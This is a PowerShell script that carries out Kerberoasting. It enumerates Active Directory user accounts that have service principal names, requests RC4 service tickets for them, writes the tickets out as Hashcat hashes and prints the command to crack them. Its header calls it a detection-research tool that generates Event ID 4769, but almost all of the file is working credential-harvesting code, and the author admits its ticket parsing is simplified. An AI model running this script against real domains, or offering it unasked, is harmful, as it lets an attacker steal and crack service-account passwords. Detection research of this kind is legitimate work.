<#
.SYNOPSIS
    Requests Kerberos TGS tickets for accounts with SPNs.
    For authorized security research and detection development only.

.DESCRIPTION
    This script requests TGS tickets for user accounts with Service Principal Names.
    Used for developing and testing Kerberos attack detections.

    Detectable Events:
    - Event ID 4769: Kerberos Service Ticket Operations
    - Encryption Type 0x17 (RC4-HMAC) is commonly flagged

.PARAMETER SPN
    Single SPN to request a ticket for.

.PARAMETER UserList
    Array of SPNs to request tickets for.

.PARAMETER OutputFile
    Path to save extracted ticket hashes (Hashcat format).

.PARAMETER EncryptionType
    Requested encryption type. RC4 (0x17) is weaker and commonly targeted.
    Options: RC4, AES128, AES256
    Default: RC4

.EXAMPLE
    .\Request-ServiceTicket.ps1 -SPN "MSSQLSvc/sqlserver.domain.com:1433"

.EXAMPLE
    .\Request-ServiceTicket.ps1 -UserList (Get-Content spn_list.txt) -OutputFile hashes.txt

.NOTES
    For authorized security research only.
    Generates Event ID 4769 in Security logs.
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory = $false)]
    [string]$SPN,

    [Parameter(Mandatory = $false)]
    [string[]]$UserList,

    [Parameter(Mandatory = $false)]
    [string]$OutputFile,

    [Parameter(Mandatory = $false)]
    [ValidateSet('RC4', 'AES128', 'AES256')]
    [string]$EncryptionType = 'RC4'
)

Function Get-TGSTicket {
    Param(
        [Parameter(Mandatory = $true)]
        [string]$ServicePrincipalName,

        [Parameter(Mandatory = $false)]
        [string]$EncType = 'RC4'
    )

    Try {
        # Request the TGS ticket using .NET Kerberos classes
        Add-Type -AssemblyName System.IdentityModel

        $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $ServicePrincipalName

        $TicketBytes = $Ticket.GetRequest()

        If ($TicketBytes) {
            # Extract the encrypted portion (for hash cracking)
            $TicketHex = [System.BitConverter]::ToString($TicketBytes) -replace '-'

            # Parse the ticket to get the encrypted part
            # The encrypted part starts after the ticket structure headers
            $Result = [PSCustomObject]@{
                SPN           = $ServicePrincipalName
                TicketHex     = $TicketHex
                HashcatFormat = ConvertTo-HashcatFormat -TicketBytes $TicketBytes -SPN $ServicePrincipalName
                RequestTime   = Get-Date
            }

            return $Result
        }
    }
    Catch {
        Write-Warning "Failed to request ticket for $ServicePrincipalName : $($_.Exception.Message)"
        return $null
    }
}

Function ConvertTo-HashcatFormat {
    Param(
        [byte[]]$TicketBytes,
        [string]$SPN
    )

    Try {
        # ASN.1 parsing to extract the encrypted part of the TGS-REP
        # Format: $krb5tgs$23$*user$realm$spn*$checksum$encrypted

        $TicketHex = [System.BitConverter]::ToString($TicketBytes) -replace '-'

        # Find the cipher text in the ticket (simplified parsing)
        # In a real TGS-REP, we need to parse ASN.1 structure
        # The encrypted part is in the enc-part field

        # Extract realm and service from SPN
        $SPNParts = $SPN -split '/'
        $ServiceClass = $SPNParts[0]

        If ($SPN -match '@(.+)$') {
            $Realm = $Matches[1]
        } Else {
            $Realm = $env:USERDNSDOMAIN
        }

        # Locate encrypted data in the ticket
        # RC4 tickets (etype 23) have a specific structure
        $EncryptedStart = 0
        For ($i = 0; $i -lt $TicketBytes.Length - 4; $i++) {
            # Look for etype tag followed by 23 (0x17) for RC4
            If ($TicketBytes[$i] -eq 0xa2 -and $TicketBytes[$i+2] -eq 0x03 -and $TicketBytes[$i+4] -eq 0x17) {
                $EncryptedStart = $i
                Break
            }
        }

        If ($EncryptedStart -gt 0) {
            # Find the cipher text after etype
            $CipherStart = $EncryptedStart + 20  # Approximate offset to cipher
            $CipherBytes = $TicketBytes[$CipherStart..($TicketBytes.Length - 1)]
            $CipherHex = [System.BitConverter]::ToString($CipherBytes) -replace '-'

            # Hashcat format for Kerberos 5 TGS-REP etype 23 (RC4)
            # $krb5tgs$23$*user$realm$spn*$checksum$edata
            $Checksum = $CipherHex.Substring(0, 32)
            $EData = $CipherHex.Substring(32)

            return "`$krb5tgs`$23`$*unknown`$${Realm}`$${SPN}*`$${Checksum}`$${EData}"
        }
        Else {
            # Fallback - return raw hex for manual analysis
            return "`$krb5tgs`$23`$*unknown`$${Realm}`$${SPN}*`$${TicketHex}"
        }
    }
    Catch {
        Write-Warning "Error converting to hashcat format: $($_.Exception.Message)"
        return $null
    }
}

Function Get-DomainUserSPNs {
    <#
    .SYNOPSIS
        Enumerates user accounts with SPNs set.
    #>

    Try {
        $Searcher = New-Object System.DirectoryServices.DirectorySearcher
        $Searcher.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*))"
        $Searcher.PropertiesToLoad.AddRange(@("samaccountname", "serviceprincipalname", "distinguishedname"))
        $Searcher.PageSize = 1000

        $Results = $Searcher.FindAll()

        $SPNList = @()
        ForEach ($Result in $Results) {
            $SPNs = $Result.Properties["serviceprincipalname"]
            ForEach ($S in $SPNs) {
                $SPNList += [PSCustomObject]@{
                    SamAccountName    = $Result.Properties["samaccountname"][0]
                    SPN               = $S
                    DistinguishedName = $Result.Properties["distinguishedname"][0]
                }
            }
        }

        return $SPNList
    }
    Catch {
        Write-Error "Failed to enumerate SPNs: $($_.Exception.Message)"
        return $null
    }
}

# Main execution
Write-Host "`n[*] Kerberos TGS Ticket Requester - Detection Research Tool" -ForegroundColor Cyan
Write-Host "[*] This generates Event ID 4769 in Security logs`n" -ForegroundColor Yellow

$TicketResults = @()

If ($SPN) {
    Write-Host "[*] Requesting ticket for: $SPN"
    $Result = Get-TGSTicket -ServicePrincipalName $SPN -EncType $EncryptionType
    If ($Result) {
        $TicketResults += $Result
        Write-Host "[+] Successfully obtained ticket" -ForegroundColor Green
    }
}
ElseIf ($UserList) {
    Write-Host "[*] Requesting tickets for $($UserList.Count) SPNs"
    $Counter = 0
    ForEach ($TargetSPN in $UserList) {
        $Counter++
        Write-Progress -Activity "Requesting TGS Tickets" -Status "$Counter of $($UserList.Count)" -PercentComplete (($Counter / $UserList.Count) * 100)

        $Result = Get-TGSTicket -ServicePrincipalName $TargetSPN -EncType $EncryptionType
        If ($Result) {
            $TicketResults += $Result
        }

        # Small delay to avoid overwhelming the DC
        Start-Sleep -Milliseconds 100
    }
    Write-Progress -Activity "Requesting TGS Tickets" -Completed
}
Else {
    # No input provided - enumerate and request all user SPNs
    Write-Host "[*] No SPN specified - enumerating domain user SPNs..."

    $DomainSPNs = Get-DomainUserSPNs

    If ($DomainSPNs) {
        Write-Host "[*] Found $($DomainSPNs.Count) user SPNs"
        Write-Host "[*] Requesting TGS tickets...`n"

        $Counter = 0
        ForEach ($Item in $DomainSPNs) {
            $Counter++
            Write-Progress -Activity "Requesting TGS Tickets" -Status "$($Item.SamAccountName): $($Item.SPN)" -PercentComplete (($Counter / $DomainSPNs.Count) * 100)

            $Result = Get-TGSTicket -ServicePrincipalName $Item.SPN -EncType $EncryptionType
            If ($Result) {
                $TicketResults += $Result
                Write-Host "[+] $($Item.SamAccountName): $($Item.SPN)" -ForegroundColor Green
            }

            Start-Sleep -Milliseconds 100
        }
        Write-Progress -Activity "Requesting TGS Tickets" -Completed
    }
    Else {
        Write-Host "[-] No user SPNs found in domain" -ForegroundColor Red
    }
}

# Output results
If ($TicketResults.Count -gt 0) {
    Write-Host "`n[*] Successfully obtained $($TicketResults.Count) ticket(s)" -ForegroundColor Green

    If ($OutputFile) {
        $Hashes = $TicketResults | Where-Object { $_.HashcatFormat } | ForEach-Object { $_.HashcatFormat }
        $Hashes | Out-File -FilePath $OutputFile -Encoding ASCII
        Write-Host "[*] Hashes saved to: $OutputFile" -ForegroundColor Cyan
        Write-Host "[*] Crack with: hashcat -m 13100 $OutputFile wordlist.txt" -ForegroundColor Yellow
    }
    Else {
        Write-Host "`n[*] Ticket Hashes (Hashcat format):`n" -ForegroundColor Cyan
        $TicketResults | ForEach-Object {
            Write-Host "SPN: $($_.SPN)" -ForegroundColor White
            Write-Host "$($_.HashcatFormat)`n" -ForegroundColor Gray
        }
    }
}
Else {
    Write-Host "`n[-] No tickets obtained" -ForegroundColor Red
}

Write-Host "`n[*] Check Security Event Log for Event ID 4769 entries" -ForegroundColor Yellow
